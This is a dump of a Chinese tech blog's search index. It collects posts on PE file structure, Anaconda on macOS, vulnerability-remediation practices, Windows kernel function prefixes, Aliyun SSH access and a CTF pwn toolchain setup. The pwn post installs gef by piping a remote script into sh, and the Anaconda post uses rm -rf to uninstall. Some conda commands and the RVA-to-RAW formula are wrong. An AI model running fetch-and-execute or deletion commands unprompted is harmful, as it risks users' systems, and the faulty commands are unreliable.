SYS, VXD 对象文件系列 OBJ 基本结构 使用010editor（二进制文件查看工具）打开一个exe可以看到如下结构： 上图是该exe文件的起始部分，也是PE文件的头部，exe运行所需要的所有信息都存储在PE头中。 ​ 从DOS头到节区头是PE头部分，其下的节区合称为PE体。文件中使用偏移（offset），内存中使用VA（Virtual Address，虚拟地址）来表示位置。文件加载到内存时，情况就会发生变化（节区大小、位置等）。文件的内容一般可分为代码（.text）、数据（.data）、资源（.rsrc）节，分别保存。PE头与各节区的尾部存在一个区域，成为NULL填充。文件/内存中节区的起始位置应该在各文件/内存最小单位的倍数上，空白区域使用NULL进行填充（如上图所示）。 VA\u0026RVA VA指进程虚拟内存的绝对地址，RVA（Relative Virtual Address，相对虚拟地址）指从某个基准未知（ImageBase）开始的相对地址。VA与RVA的换算满足如下公式： ​ RVA + IamgeBase = VA PE头内部信息主要以RVA的形式进行存储，主要原因是PE文件（主要是DLL）加载到进程虚拟内存的特定位置时， 该位置可能已经加载了其他PE文件（DLL）。此时需要进行重定位将其加载到其他的空白位置，保证程序的正常运行。 ","date":"2020-02-28","objectID":"/2020/03/RE4B-1/:2:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.1","uri":"/2020/03/RE4B-1/"},{"categories":["Tech"],"content":"三、PE头 DOS头 主要为现代PE文件可以对早期的DOS文件进行良好兼容存在，其结构体为IMAGE_DOS_HEADER。 大小为64字节，其中2个重要的成员分别是： e_magic:DOS签名（4D5A，MZ） e_lfanew：指示NT头的偏移（文件不同，值不同） DOS存根 stub，位于DOS头下方，可选，大小不固定，由代码与数据混合组成。 NT头 结构体为IMAGE_NT_HEADERS，大小为F8，由3个成员组成： 签名结构体，值为50450000h（“PE”00） 文件头，表现文件大致属性，结构体为IMAGE_FILE_HEADER，重要成员有4个： Machine：每个CPU都拥有的唯一的Machine码，兼容32位Intel x86芯片的Machine码为14C； NumberOfSections：指出文件中存在的节区数量； SizeOfOptionalHeader：指出结构体IMAGE_OPTIONAL_HEADER32（32位系统）的长度 Characteristics：标识文件属性，文件是否是可运行形态、是否为DLL等，以bit OR形式进行组合 可选头，结构体为IMAGE_OPTIONAL_HEADER32，重要成员有9个： Magic：IMAGE_OPTIONAL_HEADER32为10B，IMAGE_OPTIONAL_HEADER64为20B AddressOfEntryPoint：持有EP的RVA值，指出程序最先执行的代码起始地址 ImageBase：指出文件的优先装入地址（32位进程虚拟内存范围为：0～7FFFFFFF） SectionAlignment,FileAlignment：前者制定了节区在内存中的最小单位，后者制定了节区在磁盘文件中的最小单位 SizeOfImage：指定了PE Image在虚拟内存中所占空间的大小 SizeOfHeaders：指出整个PE头的大小 Subsystem：区分系统驱动文件和普通可执行文件 NumberOfRvaAndSize：指定DataDirectory数组的个数 DataDirectory：由IMAGE_DATA_DIRECTORY结构体组成的数组 节区头 节区头中定义了各节区的属性，包括不同的特性、访问权限等，结构体为IMAGE_SECTION_HEADER，重要成员有5个： VirtualSize：内存中节区所占大小 VirtualAddress：内存中节区起始地址（RVA） SizeOfRawData：磁盘文件中节区所占大小 Charateristics：节区属性（bit OR） ","date":"2020-02-28","objectID":"/2020/03/RE4B-1/:3:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.1","uri":"/2020/03/RE4B-1/"},{"categories":["Tech"],"content":"四、RVA To RAW PE文件从磁盘到内存的映射： 查找RVA所在节区 使用简单的公式计算文件偏移： RAW - PointerToRawData = RVA - ImageBase RAW = RVA - ImageBase + PointerToRawData example：ImageBase为0x10000000，节区为.text，文件中起始地址为0x00000400，内存中的起始地址为0x01001000，RVA = 5000，RAW = 5000 - 1000 + 400 = 4400。 ","date":"2020-02-28","objectID":"/2020/03/RE4B-1/:4:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.1","uri":"/2020/03/RE4B-1/"},{"categories":["Tech"],"content":"Mac平台下多个Python版本共存时需要进行版本管理以应对不同的开发要求。","date":"2020-02-09","objectID":"/2020/02/anaconda3/","tags":["Python","Anaconda3"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Tech"],"content":"Mac平台下多版本Python的管理实践 ","date":"2020-02-09","objectID":"/2020/02/anaconda3/:0:0","tags":["Python","Anaconda3"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Tech"],"content":"前言 Mac系统自带一个Python2，但是在实际生产时现在越来越多使用Python3。如果直接在系统上添加一个Python3，非常不方便进行管理。在进行开发时，也需要进行相关配置才能明确使用的Python版本。经过多方式、多软件尝试，最终找到一种方便的Python版本管理方式。 ","date":"2020-02-09","objectID":"/2020/02/anaconda3/:1:0","tags":["Python","Anaconda3"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Tech"],"content":"一、环境说明 首先系统自带一个Python2，然后使用HomeBrew安装了一个Python3。为了不影响系统的Python2的，需要再个人安装一个Python2和Python3。 ","date":"2020-02-09","objectID":"/2020/02/anaconda3/:2:0","tags":["Python","Anaconda3"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Tech"],"content":"二、Anaconda3 ","date":"2020-02-09","objectID":"/2020/02/anaconda3/:3:0","tags":["Python","Anaconda3"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Tech"],"content":"1. 选择理由 起初尝试过Pyenv，感觉还是比较麻烦，放弃了。尝试了目前网络上能找到的所有的版本管理方式，最终选择了Anaconda进行管理。 ","date":"2020-02-09","objectID":"/2020/02/anaconda3/:3:1","tags":["Python","Anaconda3"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Tech"],"content":"2. 安装 1. HomeBrew安装 不使用图形化管理界面，可以直接使用HomeBrew进行安装。 Terminal输入： # 查看anaconda的位置 brew search anaconda 进行安装： brew install anaconda 以brew cask的方式开始进行安装，先下载文件，然后进行输入本机密码就可以开始进行安装。 安装完成后的环境配置： #使用bash echo 'export PATH=/usr/local/anaconda3/bin:$PATH' \u003e\u003e ~/.bash_profile source ~/.bash_profile #使用zsh echo 'export PATH=/usr/local/anaconda3/bin:$PATH' \u003e\u003e ~/.zshrc source ~/.zshrc 检查： conda --vesion 安装完成。 2. 官网安装 官网地址：Anaconda3 可以下载图形安装包，也可以下载命令行安装文件。如果是第一次使用建议先安装图形安装包，这样你可以清楚地看到每个python环境里安装了哪些包。熟悉了操作之后换成命令行即可。 1. 图形化安装 图形安装完成后的主界面： 进入到Environments选项中可以查看已安装的相关环境的详细信息： 这里anaconda3自带的环境名称为base，基于Python3，该环境中安装了Python常用的各种包，如果不是定制性有极强烈要求，可以使用该环境，能满足常见的各种开发要求，无需再自行配置开发环境。 2. 命令行安装 命令行安装方式是打开终端，执行下面的命令： Python2.7： $ bash ~/Downloads/Anaconda3-5.3.1-MacOSX-x86_64.sh //python2版本 Python3.7： $ bash ~/Downloads/Anaconda3-5.3.1-MacOSX-x86_64.sh //python3版本 后面路径为安装文件的目录。 提示“In order to continue the installation process, please review the license agreement.”，点击“Enter”查看“许可证协议”；滚动屏幕到最下方，输入”yes\"表示同意协议，安装继续。 提示“Press Enter to confirm the location, Press CTRL-C to cancel the installation or specify an alternate installation directory.”,如果接受默认安装路径，则显示“PREFIX=/home//anaconda\u003c2 or 3\u003e”并且继续安装。安装过程大约几分钟。建议直接使用默认安装路径。 提示“Do you wish the installer to prepend the Anaconda install location to PATH in your /home//.bash_profile ?”，是否自动添加环境变量到.bash_profile文件中，输入“yes\"，自动添加；输入”no\"，则需要自行手动添加。如果你使用的是zsh，需要在.zshrc文件中自行添加环境变量。 提示”Thank you for installing Anaconda!”,安装完成。 source一下或重启终端使新加的环境变量生效 source ~/.bash_profile # source ~/.zshrc ","date":"2020-02-09","objectID":"/2020/02/anaconda3/:3:2","tags":["Python","Anaconda3"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Tech"],"content":"3. 卸载 ``` conda install anaconda-clean anaconda-clean #清除个人配置 rm -r /Users/XXXX/.anaconda_backup/... #删除备份，路径可能不同 rm -rf /anaconda3 vi ~/.bash_profile #删除环境变量 # vi ~/.zshrc zsh用户执行这一条 rm -rf ~/.condarc ~/.conda ~/.continuum #删除可能存在的隐藏文件 ``` ","date":"2020-02-09","objectID":"/2020/02/anaconda3/:3:3","tags":["Python","Anaconda3"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Tech"],"content":"三、方案使用 不做任何设置的前提下，安装完anaconda后，会设置为自动启动anaconda环境，默认为base环境。对于是否设置自动启动anaconda环境可以使用如下命令进行更改： # 取消自动启动 conda config auto_activate_base false # 设置自动启动 conda condif auto_activate_base true anaconda常用的命令 #查看conda版本 conda --version #更新conda版本 conda update conda #查看安装了哪些依赖库 conda list #创建新的python环境 conda create --name myenv #创建特定python版本的环境 conda create -n myenv python=3.7 #创建新环境并指定包含的库 conda create -n myenv scipy #创建新环境病指定特定版本的库 conda create -n myenv scipy=0.15.0 #复制环境 conda create --name myclone --clone myenv #查看是不是复制成功了 conda info --envs #激活、进入某个环境 source activate myenv #退出环境 source deactivate #删除环境 conda remove --name myenv --all #查看当前的环境列表 conda info --envs conda env list #查看某个环境下安装的库 conda list -n myenv #查找包 conda search XXX #安装包 conda install XXX #更新包 conda update XXX #删除包 conda remove XXX #安装到指定环境 conda install -n myenv XXX ","date":"2020-02-09","objectID":"/2020/02/anaconda3/:4:0","tags":["Python","Anaconda3"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Tech"],"content":"四、总结 Anaconda是我目前为止觉得最简单的Python管理实践方式，也可能是我对其他的了解不够深入。话说回来，适合自己的才是最好的，你觉得呢？ ","date":"2020-02-09","objectID":"/2020/02/anaconda3/:5:0","tags":["Python","Anaconda3"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Vuln"],"content":"Vuln Cyber关于漏洞修复的八种最佳实践形式","date":"2020-02-09","objectID":"/vuln/theory/","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"漏洞修复的八种最佳实践 ","date":"2020-02-09","objectID":"/vuln/theory/:0:0","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"前言 目前，企业漏洞修复面临的最严峻挑战包括复杂的基础架构、分布式应用程序、不规则无管理堆栈。为了防止威胁或控制漏洞影响范围，当今的企业必须具备相应的政策，流程和工具来进行：漏洞的分析和评估、漏洞优先级的筛选以及自动化修复漏洞。以下将介绍八种漏洞修复的最佳实践方式，以帮助克服当今动态和复杂环境中漏洞修复的挑战和要求。 ","date":"2020-02-09","objectID":"/vuln/theory/:1:0","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"一、Continuous Detection（持续性检测） 传统的漏洞扫描方式是一种周期性、间断式扫描，在两次扫描的间隙，漏洞状态是不确定的。因此，对于目标必须实行持续性检测，使得安全研究员可以随时知道当前的安全状况。因此，前两个最佳实践聚焦于如何有效实现漏洞的持续发现和检测。 在当今动态、始终处于连接状态且无边界的环境中，连续检测尤其重要。 它影响受到攻击的公司服务器，而且还影响短暂的云实例和容器，高度公开的Web应用程序，以及与网络持续连接的移动设备和IoT端点。 理论上说，企业可以使用一些公共资源，例如MITER的CVE（常见漏洞披露）列表和美国政府的国家漏洞数据库（NVD），主动扫描其资产并检测已发布的漏洞。 由事件响应和安全团队论坛（FIRST）维护的通用漏洞评分系统（CVSS）是评估漏洞严重性的良好资源。 但是，传统的主动扫描的方法会影响扫描资产的可用性（降低性能、影响资产正常运行等），因此漏洞扫描方案通常无法持续运行。 持续检测的另一个障碍是漏洞的范围和速度之快，最近三年暴露的漏洞数量是前三年的两倍。如果支持的漏洞数据库中没有最新的漏洞，对资产的扫描结果就可能存在误差。 下面给出持续性检测的3种实践方式： ","date":"2020-02-09","objectID":"/vuln/theory/:2:0","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"1. 基于主机的扫描的频率要高于基于网络的扫描的频率 基于网络的扫描器在扫描网络服务时会增加大量开销，而且需要注意不同的环境进行不同的配置设置，打开防火墙端口等。 基于主机的扫描不会遍历网络。 它们消除了网络开销，并允许进行持续扫描。（降低因为网络造成的扫描开销） ","date":"2020-02-09","objectID":"/vuln/theory/:2:1","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"2. 扫描镜像而不是实例 在现代的云原生应用程序中，大多数服务器实例是从一个镜像安装的。 扫描镜像而不是扫描实例，可以持续进行检测而又不会占用网络资源。（实例是从镜像创建而来，扫描镜像可以直接确认漏洞源头） ","date":"2020-02-09","objectID":"/vuln/theory/:2:2","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"3. 使用“无扫描”无中断的方法来增强主动扫描 使用来自现有DevOps，安全和IT数据库（例如补丁/资产管理系统）的数据，对所有网络节点上的潜在漏洞进行基于无规则的“无扫描”模式分析。 将这些无中断的“无扫描”结果与定期主动扫描的结果合并在一起后，企业可以在不影响性能的情况下实现对漏洞的接近实时可见性的状态查询和观察。 可以使用开源工具（例如osquery和QRadar）来实现此方法。（最大程度降低扫描行为对企业生产环境产生的影响，不影响系统正常运行） ","date":"2020-02-09","objectID":"/vuln/theory/:2:3","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"二、Smart Prioritization（智能优先级排序） 传统漏洞管理系统依靠外部指标来对漏洞进行优先级排序。 一种常见的指标是CVSS评分，它根据攻击媒介，可能受影响的组件的范围，机密数据的风险级别以及对可用性的影响等特征来反映漏洞的严重性。 但是，漏洞风险管理并不罕见。 纳入恶意软件的漏洞中，有44％的CVSS评分较低或中等。也就是说，单纯靠CVSS评分来管理漏洞是远远不够的。 下面给出智能优先级的1种实践方式： ","date":"2020-02-09","objectID":"/vuln/theory/:3:0","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"4. 在评估风险等级并由此判定漏洞的优先级时，应考虑攻击向量的多少和攻击环境的广泛程度 将各种外部和内部数据源进行关联，更好地了解企业独特环境中特定漏洞的严重性。 外部数据源比如CVSS评分以及威胁情报数据库，内部数据源是企业的资产管理和变更管理系统，以了解受到漏洞威胁的资产的业务重要性和安全状况。（大众标准和特定环境标准综合使用进行漏洞优先级评定，理论结合实际） 例子：在一个基于公有云的工作环境中发现了一个高CVSS评分的漏洞，但是该漏洞只能通过USB进行利用。该企业的基础架构和云监控堆栈中的信息表明，所有可能受此漏洞影响的资产都是基于云的。此时，可以将该漏洞的安全级别划分为低优先级，因为它无法在企业的物理环境中加以利用，不会造成过大的影响。 ","date":"2020-02-09","objectID":"/vuln/theory/:3:1","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"三、Orchestrated and Automated Remediation（精心设计和自动化的漏洞修复） 漏洞管理的首要目标是进行快速有效的修复。接下来的三个最佳实践可以为以补救为中心进行漏洞管理提供思路： ","date":"2020-02-09","objectID":"/vuln/theory/:4:0","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"5. 为所有相关团队维护单一的事实来源 企业通常有多个团队进行漏洞修复，例如安全团队负责漏洞检测，然后由IT或DevOps团队进行补救。有效的协作对于创建封闭的检测补救环至关重要。团队的专用数据库，流程和工具堆栈必须紧密集成到精心规划的、共享的单个事实来源的漏洞管理平台中。最佳实践可以在平台内部实施，也可以通过第三方解决方案来实现。（完善响应工作流，确保输入单一，避免多输入造成的歧义和混乱） ","date":"2020-02-09","objectID":"/vuln/theory/:4:1","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"6. 补丁并非全部内容 漏洞补丁并不是唯一的解决方案，也可以采取其他补救措施，例如配置管理和补偿控件，关闭进程，会话或模块。最佳补救方法（或方法的组合）因漏洞而异。为了实现最佳实践，基于组织的累积漏洞管理经验，维护有关如何将最佳补救方案与漏洞相匹配的知识库非常重要，也可以利用依赖于非常大的数据集的第三方知识库。（搜集并管理内部的漏洞响应数据库，也可以包含第三方的漏洞响应数据库） ","date":"2020-02-09","objectID":"/vuln/theory/:4:2","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"7. 补救措施手册 为了与当今威胁环境的可扩展性以及增长速度相匹配，漏洞修复必须尽可能自动化。实现这种自动化的一种有效方法是创建针对企业环境的预定义剧本。下面是一个简单的剧本场景： 有一些工具支持现成的和可自定义的自动修复工作流。 Vulcan Cyber等漏洞管理平台附带一个工作流库，可以对其进行自定义以满足企业的特定要求。（根据某一类企业假设某些漏洞发生的情况，预先设定一套响应流程，也就是漏洞响应的演习） ","date":"2020-02-09","objectID":"/vuln/theory/:4:3","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"四、Constant Metrics-Based Improvement（基于恒定指标的改进） ","date":"2020-02-09","objectID":"/vuln/theory/:5:0","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"8. 使用漏洞管理指标来不断改进和优化检测、优先级划分和补救过程 最佳实践的重要部分是了解哪些漏洞管理指标很重要。诸如漏洞计数、检测到的漏洞的平均CVSS分数、运行的扫描次数或基于供应商的严重性等纯粹的量化指标无法提供有关漏洞管理工作有效性的有意义的建议。如本博客中有关漏洞指标的更详细讨论所述，更有意义的指标是定性的，例如覆盖率，漏洞停留时间，一段时间内每项资产的平均漏洞数量以及满足SLA的程度。（使用量化的数据进行漏洞管理流程的迭代优化） ","date":"2020-02-09","objectID":"/vuln/theory/:5:1","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"最后说明 Vulcan Cyber从流程开头进行设计，主要是为无缝适应企业环境，以满足其独特的漏洞管理需求。它通过双向API与企业现有的扫描、监视和补救工具集成，以创建自动化的工作流程，以确保端到端漏洞检测、优先级确定和补救。对于参与漏洞修复的所有团队，Vulcan Cyber成为唯一的事实来源，其先进的优先级划分、自动化和协调功能大大缩短了补救时间，同时增强了企业的安全状况。 ","date":"2020-02-09","objectID":"/vuln/theory/:6:0","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Tech"],"content":"Windows内核函数前缀可以表明函数作用，特此总结学习。","date":"2020-02-07","objectID":"/WindowsDev/WindowsKernel/","tags":["Security","Widnows内核函数"],"title":"Windows内核函数前缀简述","uri":"/WindowsDev/WindowsKernel/"},{"categories":["Tech"],"content":"Windows内核函数前缀简述 Windows内核函数是Windows内核开发中必须要熟悉的函数，其每个函数命名一般都可以直接反映出其用途和作用对象，且函数名都按其所在的层次或模块加上了特定的前缀。了解了这些前缀，在看到函数名时就大致可以知道函数所属的层次和模块。特此对Windows内核函数的前缀做一个汇总，方便查找和学习Windows内核函数。 主要的Windows内核函数前缀罗列如下： Ex：Executive，提供堆管理和同步服务。 Nt：Native，对应于win32 API的内核函数。 Ke：内核层，所有多线程和多处理器的低等级同步活动都发生在内核中。 Zw：Win32子系统存在于用户模式中，所以用户模式中的应用程序可以容易地调用其例程。为了方便，Windows NT在内核模式中实现了一些有Zw前缀名的函数，这些函数可以使驱动程序调用Win32子系统例程。 Hal：硬件抽象层，Hal是Hardware Abstraction Layer的缩写。 Ob：对象管理器，集中控制Windows NT中的各种数据对象，WDM驱动程序仅需要对象管理器维护对象的参考计数，以防止对象被意外删除。 Mm：内存管理器，控制页表，页表定义了虚拟内存到物理内存之间的映射。 Ps：进程结构模块，创建并管理内核模式线程，普通的WDM驱动程序应使用一个独立的线程来循检无中断生成能力的设备。（Ps - Process） Se：安全参考监视器，使文件系统驱动程序执行安全检测。I/O请求到达WDM驱动程序前已经做完了安全检测。  Io：I/O管理，包含许多驱动程序可以使用的服务函数。 Fs：文件系统，Fs是File System的缩写。 Cc：文件缓存管理，Cc表示Cache。 Cm：系统配置管理，Cm是Configuration Manager的缩写。 Pp：“即插即用”管理，Pp表示PnP。（Plug and Play） Rtl：运行时程序库，Rtl是Runtime Library的缩写，包含工具例程，例如列表和串管理例程，内核模式驱动程序可以用这些例程来替代常规的ANSI标准例程，大部分例程可以从其名字上直接看出它的功能。 ","date":"2020-02-07","objectID":"/WindowsDev/WindowsKernel/:0:0","tags":["Security","Widnows内核函数"],"title":"Windows内核函数前缀简述","uri":"/WindowsDev/WindowsKernel/"},{"categories":["Tech"],"content":"简单记录一下阿里云ECS的搭建过程","date":"2020-02-05","objectID":"/2020/02/aliyun_ecs/","tags":["aliyun","ECS"],"title":"Aliyun ECS 搭建手记","uri":"/2020/02/aliyun_ecs/"},{"categories":["Tech"],"content":"Aliyun ECS 搭建手记 简单记录一下阿里云服务器的搭建过程，包括最后使用本地ssh进行连接。 ","date":"2020-02-05","objectID":"/2020/02/aliyun_ecs/:0:0","tags":["aliyun","ECS"],"title":"Aliyun ECS 搭建手记","uri":"/2020/02/aliyun_ecs/"},{"categories":["Tech"],"content":"一、服务器选择 这个因人而异，看个人。有账号就行，记住实例的登陆密码和远程登录密码（6位）。实例的登陆密码在进行本地ssh登陆的时候需要使用，远程登录密码在使用阿里云的在线shell的时候使用。 ","date":"2020-02-05","objectID":"/2020/02/aliyun_ecs/:1:0","tags":["aliyun","ECS"],"title":"Aliyun ECS 搭建手记","uri":"/2020/02/aliyun_ecs/"},{"categories":["Tech"],"content":"二、阿里云服务器（Linux）的几种连接方式简介 ","date":"2020-02-05","objectID":"/2020/02/aliyun_ecs/:2:0","tags":["aliyun","ECS"],"title":"Aliyun ECS 搭建手记","uri":"/2020/02/aliyun_ecs/"},{"categories":["Tech"],"content":"1. 通过Workench进行连接 配置比较复杂，不建议新手直接使用这种方法进行远程连接管理。但是功能比较强大。 详细配置过程建议参考官方文档：Workbench配置手册 ","date":"2020-02-05","objectID":"/2020/02/aliyun_ecs/:2:1","tags":["aliyun","ECS"],"title":"Aliyun ECS 搭建手记","uri":"/2020/02/aliyun_ecs/"},{"categories":["Tech"],"content":"2. 通过VNC进行连接 该连接方式主要是在实例管理页面开启远程管理界面，shell开启在浏览器页面中。 详细配置过程建议参考官方文档：VNC连接配置手册 ","date":"2020-02-05","objectID":"/2020/02/aliyun_ecs/:2:2","tags":["aliyun","ECS"],"title":"Aliyun ECS 搭建手记","uri":"/2020/02/aliyun_ecs/"},{"categories":["Tech"],"content":"3. 通过SSH密钥对进行连接 这种方式是我使用的方式，详细说一下步骤，简单实用。几个步骤就可以获取shell连接。 前提条件 已创建密钥对并下载.pem私钥文件 为实例绑定密钥 为实例所在的安全组添加安全组规则，放行对相应端口的访问 通过命令进行配置 找到.pem私钥文件在本地机上的存储路径，例如~/.ssh/ecs.pem。这里我一般都直接放在了~/.ssh路径下 修改私钥文件属性： chmod 400 XXXXXX.pem 进行实例连接： ssh -i ~/.ssh/XXXXX.pem root@实例ip 通过config文件进行配置 打开 ~/.ssh下的config文件，如果没有的话就自己创建一个，文件内容如下： # alias Host alias #主机别名 HostName ip #实例的公网IP地址 Port 22 #这里可以使用其他的端口，但是要注意在安全组中修改端口的出入规则 User root #使用root用户进行登录 IdentityFile XXXXX.pem #指定私钥文件 重启ssh或terminal 进行连接 ssh alias ","date":"2020-02-05","objectID":"/2020/02/aliyun_ecs/:2:3","tags":["aliyun","ECS"],"title":"Aliyun ECS 搭建手记","uri":"/2020/02/aliyun_ecs/"},{"categories":["Tech"],"content":"4. 通过用户名密码验证连接 该方式主要是使用设置的实例登录密码进行连接 输入ssh ssh root@实例ip 输入登录密码即可 ","date":"2020-02-05","objectID":"/2020/02/aliyun_ecs/:2:4","tags":["aliyun","ECS"],"title":"Aliyun ECS 搭建手记","uri":"/2020/02/aliyun_ecs/"},{"categories":["Tech"],"content":"5. 通过移动设备进行连接 一般需要使用特定的app进行连接。 详细配置过程建议参考官方文档：移动设备连接配置手册 ","date":"2020-02-05","objectID":"/2020/02/aliyun_ecs/:2:5","tags":["aliyun","ECS"],"title":"Aliyun ECS 搭建手记","uri":"/2020/02/aliyun_ecs/"},{"categories":["Tech"],"content":"三、总结 Aliyun官方的文档很详细了，强烈建议如果中间出现什么问题，优先参考官方文档。 ","date":"2020-02-05","objectID":"/2020/02/aliyun_ecs/:3:0","tags":["aliyun","ECS"],"title":"Aliyun ECS 搭建手记","uri":"/2020/02/aliyun_ecs/"},{"categories":["CTF"],"content":"简单记录一下Linux平台下的pwn环境的搭建过程","date":"2020-02-05","objectID":"/ctf/pwn/","tags":["CTF","pwn"],"title":"CTF Pwn环境搭建","uri":"/ctf/pwn/"},{"categories":["CTF"],"content":"Linux平台下的CTF Pwn环境搭建 ","date":"2020-02-05","objectID":"/ctf/pwn/:0:0","tags":["CTF","pwn"],"title":"CTF Pwn环境搭建","uri":"/ctf/pwn/"},{"categories":["CTF"],"content":"前言 最近遇到很多人想玩CTF，咨询环境问题。为了更好地将研究重心放在技术本身，这里简单整理一下个人的Pwn环境的搭建过程，仅供参考。 ","date":"2020-02-05","objectID":"/ctf/pwn/:1:0","tags":["CTF","pwn"],"title":"CTF Pwn环境搭建","uri":"/ctf/pwn/"},{"categories":["CTF"],"content":"一、操作系统选择 因为是Pwn环境，涉及到Windows平台的比较少，所以一般使用Linux或者MacOS。我个人是一套Linux的虚拟环境搭配MacOS的物理环境，基本能适应所有的Pwn环境要求。 物理环境：MBP 2015 虚拟环境：Ubuntu 18.04 需要注意，Linux的版本太高很多插件容易出问题，所以不建议使用最新版本的Linux系统，最稳定的不是太老旧的就可以。此外，环境因人而异，没有模板，不是固定的，按需分配。 ","date":"2020-02-05","objectID":"/ctf/pwn/:2:0","tags":["CTF","pwn"],"title":"CTF Pwn环境搭建","uri":"/ctf/pwn/"},{"categories":["CTF"],"content":"二、必备一般软件 vim：个人必备，强烈建议学习一点vim的相关知识，可以提高效率，避免安装过多的编辑器或者IDE git：必备，很多高效的插件都是放在GitHub上的 python：必备，建议python3，毕竟python2已经不支持了 pip：必备，有一些插件需要使用pip进行安装 一款编辑器：这个看个人需求，vscode、sublime text等，个人喜欢就好。如果有条件的话，可以设置一下配置，当作一个简单的开发IDE使用，毕竟Pwn环境中开发的代码不会很多。 以上各软件根据官方文档自行安装即可。 ","date":"2020-02-05","objectID":"/ctf/pwn/:3:0","tags":["CTF","pwn"],"title":"CTF Pwn环境搭建","uri":"/ctf/pwn/"},{"categories":["CTF"],"content":"三、Pwn常用软件 涉及到的各种软件的安装，均以Ubuntu平台为例 pwntools 一个ctf框架和漏洞利用开发库，用python开发,必备神器，作用不多解释。 安装方法： $ apt-get install python python-pip python-dev libssl-dev libffi-dev build-essential $ pip install -U setuptools $ pip install --upgrade pip $ pip install --upgrade pwntools 个人使用的是python2版本，需要注意一下。pwntools现在支持python3了，这里给出GitHub地址，有需要的可以参考其readme进行安装python3的pwntools。 支持python3的pwntools 安装完成后，打开python测试, 执行from pwn import *不会报错即可。 （备注：在mac平台下不要使用pip安装，你会怀疑人生的，使用homebrew安装） gdb 动态调试软件，必备。 安装方法： apt-get install gdb peda/pwngdb/gef 这是常见的gdb的三个插件，配合gdb使用可以提升调试效率。 安装pwndbg： git clone https://github.com/pwndbg/pwndbg cd pwndbg ./setup.sh 安装peda： git clone https://github.com/longld/peda.git~/peda echo \"source ~/peda/peda.py\" \u003e\u003e ~/.gdbinit 安装gef： wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh| sh wget -q -O ~/.gdbinit-gef.py https://github.com/hugsy/gef/raw/master/gef.py echo source ~/.gdbinit-gef.py \u003e\u003e ~/.gdbinit 因为在同一时刻只能使用一种插件，而且在解决不同类型的题目时使用不同的插件，因此需要配置三种插件的快捷切换。 首先，gdb使用哪种插件是在.gdbinit文件（一般在root目录下）中使用source进行控制的，我们可以在使用插件时注释掉其他的source命令，即可单独使用某一插件。但是每次都编辑该文件实在是麻烦，因此可以使用脚本进行选择。 #!/bin/bash function Mode_change { name=$1 gdbinitfile=~/.gdbinit #这个路径按照你的实际情况修改 # gdbinitfile=/root/Desktop/mode peda=\"source ~/peda/peda.py\" #这个路径按照你的实际情况修改 gef=\"source ~/.gdbinit-gef.py\" #这个路径按照你的实际情况修改 pwndbg=\"source /opt/pwndbg/gdbinit.py\" #这个路径按照你的实际情况修改 sign=$(cat $gdbinitfile | grep -n \"#this place is controled by user's shell\") #此处上面的查找内容要和你自己的保持一致 pattern=\":#this place is controled by user's shell\" number=${sign%$pattern} location=$[number+2] parameter_add=${location}i parameter_del=${location}d message=\"TEST\" if [ $name -eq \"1\" ];then sed -i \"$parameter_del\" $gdbinitfile sed -i \"$parameter_add$peda\" $gdbinitfile echo -e \"Please enjoy the peda!\\n\" elif [ $name -eq \"2\" ];then sed -i \"$parameter_del\" $gdbinitfile sed -i \"$parameter_add$gef\" $gdbinitfile echo -e \"Please enjoy the gef!\\n\" else sed -i \"$parameter_del\" $gdbinitfile sed -i \"$parameter_add$pwndbg\" $gdbinitfile echo -e \"Please enjoy the pwndbg!\\n\" fi } echo -e \"Please choose one mode of GDB?\\n1.peda 2.gef 3.pwndbg\" read -p \"Input your choice:\" num if [ $num -eq \"1\" ];then Mode_change $num elif [ $num -eq \"2\" ];then Mode_change $num elif [ $num -eq \"3\" ];then Mode_change $num else echo -e \"Error!\\nPleasse input right number!\" fi 